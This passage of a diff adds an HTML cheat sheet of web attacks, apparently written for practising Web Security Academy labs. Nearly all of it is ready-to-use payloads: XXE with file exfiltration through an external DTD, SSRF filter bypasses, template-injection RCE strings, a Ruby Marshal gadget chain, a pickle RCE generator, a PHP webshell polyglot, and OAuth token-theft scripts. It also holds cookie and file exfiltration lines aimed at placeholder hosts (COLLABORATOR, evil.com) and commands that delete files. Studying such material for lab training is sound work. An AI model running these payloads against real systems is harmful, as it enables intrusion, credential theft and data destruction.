+&lt;/foo&gt;</code></pre>
+
+        <p><strong>SVG upload (upload as .svg, Apache Batik):</strong></p>
+        <pre><code>&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;]&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;text&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+
+        <p><strong>Exfil via external DTD (blind → data in Collaborator):</strong></p>
+        <p style="color:var(--muted);font-size:12px;margin-bottom:6px">⚠️ Cannot use <code>%entity;</code> inside another entity in the same inline DOCTYPE — XML parser forbids it. So the logic is moved to a separate DTD file on the exploit server.</p>
+        <p>Step 1 — put <code>malicious.dtd</code> on exploit server:</p>
+        <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil
+  SYSTEM 'http://COLLABORATOR/?x=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+        <p>Step 2 — reference that file in the request (loads and executes the DTD):</p>
+        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/malicious.dtd"&gt;
+  %xxe;
+]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;1&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+        <p>Step 3 — Burp Collaborator → Poll now → find <code>?x=hostname_value</code> in HTTP request.</p>
+
+        <p style="margin-top:12px"><strong>Error-based exfil (data visible in error message — no Collaborator needed):</strong></p>
+        <p>Put on exploit server:</p>
+        <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error
+  SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;</code></pre>
+        <p>In the request — same reference via <code>%xxe;</code>. Server returns an error with file contents in the path.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 17. SSRF -->
+  <section class="section" id="ssrf">
+    <h2>17. SSRF</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: URL parameters (<code>?url=</code>, <code>?webhook=</code>, <code>stockApi</code>, fetch by link).</p>
+        <ul style="margin-top:8px">
+          <li>Find params like <code>url</code>, <code>fetch</code>, <code>callback</code>, <code>redirect</code>, <code>next</code>, <code>stockApi</code></li>
+          <li>Substitute <code>http://BURP-COLLABORATOR/</code> → check for DNS/HTTP request</li>
+          <li><strong>Blind SSRF:</strong> <code>Referer: http://COLLABORATOR/</code> — analytics fetches Referer</li>
+        </ul>
+        <p style="margin-top:8px"><strong>Standard targets:</strong></p>
+        <pre><code>http://localhost/admin
+http://localhost:8080/admin
+http://127.0.0.1/admin
+http://192.168.0.1:8080/admin
+http://169.254.169.254/latest/meta-data/</code></pre>
+        <p style="margin-top:8px"><strong>Scanning internal range (Intruder):</strong></p>
+        <pre><code># Enumerate 192.168.0.1–255 on last octet
+# stockApi=http://192.168.0.§1§:8080/admin
+# Payload: Numbers 1–255, step 1
+# Look for: status 200 → found admin host
+# Then: /admin/delete?username=carlos</code></pre>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>Bypass blacklist:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Bypass</th><th>Example</th></tr>
+            <tr><td>IP shorthand</td><td><code>http://127.1/</code></td></tr>
+            <tr><td>Decimal IP</td><td><code>http://2130706433/</code></td></tr>
+            <tr><td>Double URL encoding</td><td><code>http://127.0.0.1/%2561dmin</code></td></tr>
+            <tr><td>Case variation</td><td><code>http://LoCalHoSt/</code></td></tr>
+            <tr><td>DNS spoofed</td><td><code>spoofed.burpcollaborator.net</code> → 127.0.0.1</td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>Bypass whitelist:</strong></p>
+        <ul>
+          <li>Credentials: <code>https://allowed-host@evil.com/</code></li>
+          <li>Open redirect: <code>?url=https://allowed-host/redirect?to=http://internal</code></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- 18. SSTI -->
+  <section class="section" id="ssti">
+    <h2>18. SSTI <a href="https://portswigger.net/web-security/server-side-template-injection/exploiting" target="_blank" style="font-size:0.6em;font-weight:400">Cheat sheet ↗</a></h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: fields rendered into emails/PDFs/pages via a template engine.</p>
+        <p style="margin-top:8px"><strong>Code context SSTI</strong> — injection is inside an existing template expression, not as standalone input. Input like <code>user.name</code> is already wrapped in <code>{{ }}</code> by the server. To detect: close the expression first, then inject:</p>
+        <pre><code>user.name}}{{7*7}}   → if 49 appears → code context SSTI (Tornado/Jinja2)
+user.name}}{%25+import+os+%25}{{os.system('id')   → RCE (Tornado)</code></pre>
+        <p style="font-size:12px;color:var(--muted)">Typical location: display name / author format settings that get embedded into blog post rendering. Check POST params like <code>blog-post-author-display</code>.</p>
+        <p style="margin-top:8px"><strong>Engine identification:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Payload</th><th>Result</th><th>Engine</th></tr>
+            <tr><td><code>{{7*7}}</code></td><td>49</td><td>Twig / Jinja2</td></tr>
+            <tr><td><code>${7*7}</code></td><td>49</td><td>Freemarker / Thymeleaf</td></tr>
+            <tr><td><code>#{7*7}</code></td><td>49</td><td>Ruby ERB</td></tr>
+            <tr><td><code>{{7*'7'}}</code></td><td>7777777</td><td>Jinja2 (Twig returns 49)</td></tr>
+            <tr><td><code>&lt;%=7*7%&gt;</code></td><td>49</td><td>ERB</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Engine</th><th>RCE payload</th></tr>
+            <tr><td>Jinja2</td><td><code>{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0]}}</code></td></tr>
+            <tr><td>Twig</td><td><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></td></tr>
+            <tr><td>Freemarker</td><td><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</code></td></tr>
+            <tr><td>ERB (Ruby)</td><td><code>&lt;%= system("id") %&gt;</code></td></tr>
+            <tr><td>Tornado</td><td><code>{% import os %}{{os.system('id')}}</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>File read / delete per engine:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Engine</th><th>Read file</th><th>Delete file</th></tr>
+            <tr>
+              <td>Jinja2</td>
+              <td><code>{{''.__class__.__mro__[1].__subclasses__()[408]('cat /home/carlos/morale.txt',shell=True,stdout=-1).communicate()[0]}}</code></td>
+              <td><code>{{''.__class__.__mro__[1].__subclasses__()[408]('rm /home/carlos/morale.txt',shell=True,stdout=-1).communicate()[0]}}</code></td>
+            </tr>
+            <tr>
+              <td>Twig</td>
+              <td><code>{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("/home/carlos/morale.txt")}}</code></td>
+              <td><code>{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}</code></td>
+            </tr>
+            <tr>
+              <td>Freemarker</td>
+              <td><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("cat /home/carlos/morale.txt")}</code></td>
+              <td><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("rm /home/carlos/morale.txt")}</code></td>
+            </tr>
+            <tr>
+              <td>ERB (Ruby)</td>
+              <td><code>&lt;%= File.read('/home/carlos/morale.txt') %&gt;</code></td>
+              <td><code>&lt;%= system("rm /home/carlos/morale.txt") %&gt;</code></td>
+            </tr>
+            <tr>
+              <td>Tornado</td>
+              <td><code>{% import os %}{{open('/home/carlos/morale.txt').read()}}</code></td>
+              <td><code>{% import os %}{{os.system('rm /home/carlos/morale.txt')}}</code></td>
+            </tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>Code context (Tornado/Jinja2):</strong> input inside <code>{{user.name}}</code>:</p>
+        <pre><code>}}{% import os %}{{os.system('id')}}{{</code></pre>
+        <p><strong>Django:</strong> <code>{% debug %}</code> → all context variables + <code>settings.SECRET_KEY</code></p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 19. Server-Side Prototype Pollution -->
+  <section class="section" id="proto2">
+    <h2>19. Server-Side Prototype Pollution</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: JSON parameters, merge/clone of objects on server (Node.js).</p>
+        <p style="margin-top:8px"><strong>Detection without reflection:</strong></p>
+        <pre><code>{"__proto__": {"status": 555}}
+→ any 404 returns 555 instead of 404</code></pre>
+        <pre><code>{"__proto__": {"json spaces": 10}}
+→ JSON responses start coming with large indentation</code></pre>
+        <p>Server-Side Prototype Pollution Scanner (BApp) → auto-detect.</p>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p>Same techniques as #11 (Prototype Pollution), but via request body:</p>
+        <pre><code>{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+// RCE via child_process
+{"__proto__": {
+  "execArgv": [
+    "--eval=require('child_process').exec('curl https://COLLABORATOR')"
+  ]
+}}</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 20. LFI / Path Traversal -->
+  <section class="section" id="lfi">
+    <h2>20. LFI / Path Traversal</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: <code>?file=</code>, <code>?img=</code>, <code>?path=</code>, <code>filename=</code>.</p>
+        <ul style="margin-top:8px">
+          <li>Substitute <code>../../../etc/passwd</code> → get a response?</li>
+          <li>Absolute path: <code>/etc/passwd</code></li>
+          <li>Check: are <code>../</code> sequences stripped?</li>
+          <li>Suffix present (extension) → try null byte <code>%00</code></li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Payload</th></tr>
+            <tr><td>Basic</td><td><code>../../../etc/passwd</code></td></tr>
+            <tr><td><code>../</code> stripped</td><td><code>....//....//....//etc/passwd</code></td></tr>
+            <tr><td>URL encoding</td><td><code>..%2f..%2f..%2fetc%2fpasswd</code></td></tr>
+            <tr><td>Double encoding</td><td><code>..%252f..%252fetc%252fpasswd</code></td></tr>
+            <tr><td>Absolute path</td><td><code>/etc/passwd</code></td></tr>
+            <tr><td>Bypass prefix</td><td><code>/var/www/images/../../../etc/passwd</code></td></tr>
+            <tr><td>Bypass suffix</td><td><code>../../../etc/passwd%00.png</code></td></tr>
+            <tr><td>Upload dir escape</td><td><code>filename="..%2fexploit.php"</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 21. File Upload -->
+  <section class="section" id="upload">
+    <h2>21. File Upload</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: any file upload form.</p>
+        <ul style="margin-top:8px">
+          <li>Upload <code>.php</code> directly → accessible via URL?</li>
+          <li>Check where the file is saved and whether PHP/JS is executed</li>
+          <li>Try Content-Type: <code>image/jpeg</code> with <code>.php</code> extension</li>
+          <li>Try alternative extensions: <code>.php5</code>, <code>.phtml</code>, <code>.phar</code></li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Description</th></tr>
+            <tr><td>Change Content-Type</td><td><code>image/jpeg</code> when uploading <code>.php</code></td></tr>
+            <tr><td>Alt extensions</td><td><code>.php5</code>, <code>.phtml</code>, <code>.phar</code></td></tr>
+            <tr><td>Null byte</td><td><code>exploit.php%00.jpg</code> → saved as <code>exploit.php</code></td></tr>
+            <tr><td>Directory escape</td><td><code>filename="..%2fexploit.php"</code></td></tr>
+            <tr><td><code>.htaccess</code></td><td><code>AddType application/x-httpd-php .evil</code> → upload <code>exploit.evil</code></td></tr>
+            <tr><td>Polyglot JPEG+PHP</td><td><code>exiftool -Comment='&lt;?php echo system($_GET["cmd"]); ?&gt;' image.jpg -o exploit.php</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 22. Deserialization -->
+  <section class="section" id="deser">
+    <h2>22. Deserialization</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Check cookies and parameters for signatures in Burp HTTP History:</p>
+        <div class="table-wrap" style="margin-top:8px">
+          <table>
+            <tr><th>Signature</th><th>What it is</th></tr>
+            <tr><td><code>rO0AB</code></td><td>Java serialized object (base64)</td></tr>
+            <tr><td><code>ac ed 00 05</code></td><td>Java serialized object (hex)</td></tr>
+            <tr><td><code>H4sI</code></td><td>gzip + base64 (Java inside)</td></tr>
+            <tr><td><code>O:</code> / <code>a:</code></td><td>PHP serialized object</td></tr>
+            <tr><td><code>BAh</code> / <code>BAg</code></td><td>Ruby Marshal object (base64)</td></tr>
+            <tr><td><code>04 08</code></td><td>Ruby Marshal object (hex)</td></tr>
+            <tr><td><code>gASV</code></td><td>Python pickle (base64)</td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px"><strong>Ruby Marshal:</strong> decode cookie in Burp Decoder (URL → Base64) — first two bytes are <code>04 08</code>. In base64 this always starts with <code>BAh</code> or <code>BAg</code>.</p>
+        <p style="margin-top:8px">Decode in Burp Decoder: URL → Base64 → Gzip → class names become visible.</p>
+        <div class="table-wrap" style="margin-top:8px">
+          <table>
+            <tr><th>What you see in decoded object</th><th>Chain</th></tr>
+            <tr><td><code>org.apache.commons.beanutils</code></td><td><code>CommonsBeanutils1</code></td></tr>
+            <tr><td><code>commons.collections</code> 3.x</td><td><code>CommonsCollections1</code></td></tr>
+            <tr><td><code>commons.collections</code> 4.x</td><td><code>CommonsCollections4</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:8px">PHP source leak: request <code>?file=CustomTemplate.php~</code> (tilde = editor backup). Find magic methods: <code>__destruct()</code>, <code>__wakeup()</code>.</p>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <p><strong>PHP — arbitrary object injection:</strong></p>
+        <pre><code>O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+# base64 encode → URL-encode → insert into cookie</code></pre>
+        <p><strong>PHP — gadget chains:</strong></p>
+        <pre><code>phpggc Symfony/RCE4 exec 'id' | base64
+# With HMAC signature:
+phpggc ... | php -r "echo hash_hmac('sha1',
+  file_get_contents('php://stdin'), 'SECRET_KEY');"</code></pre>
+        <p><strong>Java — ysoserial:</strong></p>
+        <pre><code>java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
+     --add-opens java.base/java.util=ALL-UNNAMED \
+     --add-opens java.base/java.net=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     -jar ysoserial.jar CommonsCollections6 'COMMAND' > payload.ser
+
+cat payload.ser | gzip | base64 | tr -d '\n'
+# → URL-encode key characters before inserting into cookie
+
+# With full URL-encoding (safest):
+cat payload.ser | gzip | base64 | tr -d '\n' | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"</code></pre>
+        <p><strong>Runtime.exec() does not spawn a shell</strong> — shell metacharacters (<code>$(...)</code>, <code>|</code>, <code>;</code>) don't work. Use self-contained commands:</p>
+        <div class="table-wrap" style="margin-top:6px">
+          <table>
+            <tr><th>Goal</th><th>Command</th></tr>
+            <tr><td>Delete file</td><td><code>rm /home/carlos/morale.txt</code></td></tr>
+            <tr><td>OOB check (curl)</td><td><code>curl http://COLLABORATOR</code></td></tr>
+            <tr><td>OOB check (dig)</td><td><code>dig COLLABORATOR</code></td></tr>
+            <tr><td>Exfil file via curl</td><td><code>curl -d @/home/carlos/secret http://COLLABORATOR</code></td></tr>
+            <tr><td>Exfil file via dig</td><td><code>dig $(cat /home/carlos/secret).COLLABORATOR</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:12px"><strong>Ruby Marshal — universal gadget chain (vakzz, devcraft.io):</strong></p>
+        <ol style="margin-top:4px;padding-left:20px">
+          <li>Edit <code>ruby_marshal_exploit.rb</code> — set the command in the <code>COMMAND</code> variable at the top.</li>
+          <li>Generate the payload and URL-encode in one line:<br>
+            <code>ruby ruby_marshal_exploit.rb | base64 | tr -d '\n' | ruby -r 'uri' -e 'puts URI.encode_www_form_component(STDIN.read.chomp)'</code><br>
+            Or: <code>ruby ruby_marshal_exploit.rb | base64 | tr -d '\n'</code> → paste into Burp Decoder → <strong>Encode as URL</strong>.
+          </li>
+          <li>In Burp Repeater — replace the <code>session</code> cookie value with the result → Send.</li>
+          <li><strong>HTTP 500 is expected</strong> — the command executes before the app crashes on the invalid session. The lab still counts it as solved.</li>
+        </ol>
+        <pre><code>## exploit.rb — change the command on the @git_set line:
+
+Gem::SpecFetcher
+Gem::Installer
+
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")         # ← variant 1: delete file
+# rs.instance_variable_set('@git_set', "curl -d @/home/carlos/secret http://COLLABORATOR")  # ← variant 2: exfil
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+print payload</code></pre>
+        <p style="margin-top:12px"><strong>Python pickle — RCE via __reduce__:</strong></p>
+        <pre><code># Generate malicious pickle payload:
+python3 -c "
+import pickle, os, base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('rm /home/carlos/morale.txt',))
+
+print(base64.b64encode(pickle.dumps(Exploit())).decode())
+"
+# → URL-encode the output → insert as cookie / POST parameter</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- 23. OS Command Injection -->
+  <section class="section" id="cmdi">
+    <h2>23. OS Command Injection</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: ping, nslookup, file conversion, any feature that calls shell.</p>
+        <ul style="margin-top:8px">
+          <li>Insert <code>; sleep 5</code> → pause in response = blind injection</li>
+          <li>OOB: <code>; nslookup COLLABORATOR</code> → check Burp Collaborator</li>
+          <li>Try all separators: <code>;</code> <code>|</code> <code>&amp;</code> <code>&amp;&amp;</code> <code>||</code> <code>`</code> <code>$()</code></li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Type</th><th>Payload</th></tr>
+            <tr><td>Inline</td><td><code>; whoami</code> / <code>| whoami</code> / <code>&amp; whoami</code> / <code>&amp;&amp; whoami</code></td></tr>
+            <tr><td>Subshell</td><td><code>`whoami`</code> / <code>$(whoami)</code></td></tr>
+            <tr><td>Blind (time)</td><td><code>; sleep 10</code> / <code>&amp; ping -c 10 127.0.0.1 &amp;</code></td></tr>
+            <tr><td>Blind (OOB)</td><td><code>; nslookup COLLABORATOR</code> / <code>&amp; nslookup COLLABORATOR &amp;</code></td></tr>
+            <tr><td>Blind → file</td><td><code>||whoami&gt;/var/www/images/out.txt||</code> → GET <code>?filename=out.txt</code></td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 24. Clickjacking -->
+  <section class="section" id="clickjack">
+    <h2>24. Clickjacking</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: pages without <code>X-Frame-Options</code> / <code>CSP: frame-ancestors</code>.</p>
+        <ul style="margin-top:8px">
+          <li>Open page in iframe → does it render?</li>
+          <li>No <code>X-Frame-Options: DENY/SAMEORIGIN</code> in headers</li>
+          <li>No <code>Content-Security-Policy: frame-ancestors</code></li>
+          <li>Page has a state-changing button (delete, email change)</li>
+        </ul>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <pre><code>&lt;style&gt;
+  iframe { position:relative; width:700px; height:500px;
+           opacity:0.1; z-index:2; }
+  div    { position:absolute; top:300px; left:60px; z-index:1; }
+&lt;/style&gt;
+&lt;div&gt;Click me&lt;/div&gt;
+&lt;iframe src="https://vulnerable-site.com/account"&gt;&lt;/iframe&gt;</code></pre>
+        <div class="table-wrap" style="margin-top:8px">
+          <table>
+            <tr><th>Type</th><th>Description</th></tr>
+            <tr><td>Prefilled form</td><td><code>src="https://site.com/email?email=attacker@evil.com"</code></td></tr>
+            <tr><td>Frame buster bypass</td><td>page checks <code>top !== self</code> → <code>sandbox="allow-forms"</code> in iframe</td></tr>
+            <tr><td>Clickjacking → DOM XSS</td><td>click triggers XSS via <code>onclick</code></td></tr>
+            <tr><td>Multi-step</td><td>two decoy divs — first positions cursor, second is the final click</td></tr>
+          </table>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 25. OAuth -->
+  <section class="section" id="oauth">
+    <h2>25. OAuth</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>How to find &amp; verify</h3>
+        <p>Surface: "Login with Google/GitHub", <code>redirect_uri</code>.</p>
+        <ol style="margin-top:8px">
+          <li>No <code>state</code> parameter → vulnerable to CSRF on linking</li>
+          <li>Change <code>redirect_uri</code> → accepts different path/domain?</li>
+          <li>Implicit flow → intercept token → swap email</li>
+          <li>Client registration endpoint → try <code>logo_uri</code> SSRF</li>
+        </ol>
+      </div>
+      <div class="sub exploit">
+        <h3>How to exploit</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>Description</th></tr>
+            <tr><td>Implicit flow email swap</td><td>intercept token exchange → replace email with victim's</td></tr>
+            <tr><td>Forced linking CSRF</td><td><code>/oauth-linking</code> without <code>state</code> → CSRF-link your account to victim</td></tr>
+            <tr><td><code>redirect_uri</code> not validated</td><td><code>&amp;redirect_uri=https://evil.com</code> → auth code sent to attacker</td></tr>
+            <tr><td><code>redirect_uri</code> path traversal</td><td><code>redirect_uri=https://site.com/oauth/callback/../logout</code> → open redirect → steal token</td></tr>
+            <tr><td>OpenID <code>logo_uri</code> SSRF</td><td><code>{"logo_uri": "http://169.254.169.254/latest/meta-data/"}</code></td></tr>
+          </table>
+        </div>
+        <p style="margin-top:10px"><strong>Token leakage via redirect_uri path traversal + open redirect (implicit flow):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Chain: path traversal bypasses redirect_uri validation → open redirect sends victim to exploit server → JS reads token from <code>#fragment</code> (browser doesn't send hash to server) → moves it to query string where it hits server logs.</p>
+        <pre><code>&lt;script&gt;
+  if (!document.location.hash) {
+    // Step 1: victim has no token yet → send to OAuth
+    // redirect_uri: path traversal to bypass validation,
+    // then open redirect (?path=) to our server
+    window.location = 'https://OAUTH-SERVER/auth'
+      + '?client_id=CLIENT-ID'
+      + '&redirect_uri=https://LAB/oauth-callback/../post/next?path=https://EXPLOIT/exploit/'
+      + '&response_type=token'
+      + '&nonce=1234'
+      + '&scope=openid%20profile%20email'
+  } else {
+    // Step 2: victim returned with #access_token=... in URL fragment
+    // hash is never sent to server → read it in JS, move to query string
+    window.location = '/?'+document.location.hash.substr(1)
+  }
+&lt;/script&gt;</code></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- Exploit server delivery -->
+  <section class="section" id="delivery">
+    <h2>Exploit server delivery</h2>
+    <div class="subsections">
+      <div class="sub find">
+        <h3>When to use what</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Technique</th><th>When</th></tr>
+            <tr><td><code>&lt;script&gt;window.location='...'&lt;/script&gt;</code></td><td>Need victim's browser to navigate (OAuth, CSRF with redirect)</td></tr>
+            <tr><td><code>&lt;img src="..."&gt;</code></td><td>Trigger GET request silently (cookie injection, cache poison)</td></tr>
+            <tr><td><code>&lt;img src="..." onerror="..."&gt;</code></td><td>Chain two steps: GET → then JS action (inject cookie → submit form)</td></tr>
+            <tr><td><code>&lt;form&gt; + submit()</code></td><td>POST request with body (CSRF, no-cors)</td></tr>
+            <tr><td><code>fetch()</code></td><td>Exfiltrate data to Collaborator/exploit server</td></tr>
+            <tr><td><code>&lt;iframe src="..."&gt;</code></td><td>Clickjacking — overlay UI over target page</td></tr>
+          </table>
+        </div>
+      </div>
+      <div class="sub exploit">
+        <h3>Templates</h3>
+        <p><strong>Silent GET (cookie inject, CSRF trigger):</strong></p>
+        <pre><code>&lt;img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None"
+     onerror="document.forms[0].submit()"&gt;
+&lt;form action="https://LAB/my-account/change-email" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;input type="hidden" name="csrf" value="YOUR-TOKEN"&gt;
+&lt;/form&gt;</code></pre>
+
+        <p><strong>Navigate victim (OAuth, open redirect):</strong></p>
+        <pre><code>&lt;script&gt;
+  if (!document.location.hash) {
+    window.location = 'https://OAUTH-SERVER/auth?...'
+  } else {
+    window.location = '/?'+document.location.hash.substr(1)
+  }
+&lt;/script&gt;</code></pre>
+
+        <p><strong>XSS → exfil cookies:</strong></p>
+        <pre><code>&lt;script&gt;
+  fetch('https://COLLABORATOR/?c='+document.cookie, {mode:'no-cors'})
+&lt;/script&gt;</code></pre>
+
+        <p><strong>XSS → CSRF (change email):</strong></p>
+        <pre><code>&lt;script&gt;
+  fetch('/my-account/change-email', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: 'email=attacker@evil.com&csrf='+document.querySelector('[name=csrf]').value
+  })
+&lt;/script&gt;</code></pre>
+
+        <p><strong>Clickjacking:</strong></p>
+        <pre><code>&lt;style&gt;
+  iframe { position:absolute; top:0; left:0; width:100%; height:100%;
+           opacity:0.0001; z-index:2; }
+  button { position:absolute; top:300px; left:60px; z-index:1; }
+&lt;/style&gt;
+&lt;button&gt;Click me&lt;/button&gt;
+&lt;iframe src="https://LAB/my-account"&gt;&lt;/iframe&gt;</code></pre>
+
+        <p><strong>Redirect from exploit server:</strong></p>
+        <pre><code>&lt;!-- Body: --&gt;
+&lt;script&gt;window.location='https://LAB/...'&lt;/script&gt;
+
+&lt;!-- Or via Response headers on exploit server: --&gt;
+HTTP/1.1 301 Moved Permanently
+Location: https://LAB/...</code></pre>
+
+        <p><strong>postMessage → DOM XSS (web message source):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Site has <code>addEventListener('message',...)</code> that puts <code>event.data</code> into <code>innerHTML</code> without validation. Send malicious HTML via iframe.</p>
+        <pre><code>&lt;!-- Trigger print() --&gt;
+&lt;iframe src="https://LAB/"
+  onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;
+&lt;/iframe&gt;
+
+&lt;!-- Steal cookies --&gt;
+&lt;iframe src="https://LAB/"
+  onload="this.contentWindow.postMessage('&lt;img src=1 onerror=fetch(`https://COLLABORATOR/?c=`+document.cookie)&gt;','*')"&gt;
+&lt;/iframe&gt;</code></pre>
+
+        <p><strong>CORS — XSS on trusted subdomain → steal accountDetails:</strong></p>
+        <p style="font-size:12px;color:var(--muted)">Main domain trusts <code>stock.*</code> subdomain in ACAO. Subdomain has XSS via URL param. Script runs in trusted origin → credentialed request to main domain → response exfiltrated to exploit server logs.</p>
+        <pre><code>&lt;script&gt;
+document.location="http://stock.LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req=new XMLHttpRequest();req.onload=reqListener;req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();function reqListener(){location='https://EXPLOIT-SERVER/log?key='%2bthis.responseText};&lt;/script&gt;&amp;storeId=1"
+&lt;/script&gt;</code></pre>
+
+        <p><strong>iframe — load XSS payload first, then redirect (two-step):</strong></p>
+        <p style="font-size:12px;color:var(--muted)">XSS fires on the first page load (URL with payload), then <code>onload</code> redirects the iframe to the clean home page — bypasses single-page caching or triggers the XSS before the victim sees anything unusual.</p>
+        <pre><code>&lt;iframe src="https://LAB/product?productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;"
+  onload="if(!window.x)this.src='https://LAB';window.x=1;"&gt;
+&lt;/iframe&gt;</code></pre>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<script>
+  const sections = document.querySelectorAll('.section');
+  const links = document.querySelectorAll('#sidebar a');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        links.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`#sidebar a[href="#${entry.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
